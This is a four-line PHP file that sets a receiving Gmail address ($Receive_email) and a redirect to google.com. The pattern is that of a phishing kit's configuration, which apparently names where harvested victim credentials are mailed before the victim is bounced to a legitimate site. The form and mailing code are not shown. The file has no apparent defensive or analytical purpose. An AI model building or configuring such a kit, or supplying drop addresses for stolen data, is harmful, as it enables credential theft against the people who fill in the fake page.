<?php 
$Receive_email="desmondjack700@gmail.com";
$redirect="https://www.google.com/";
?>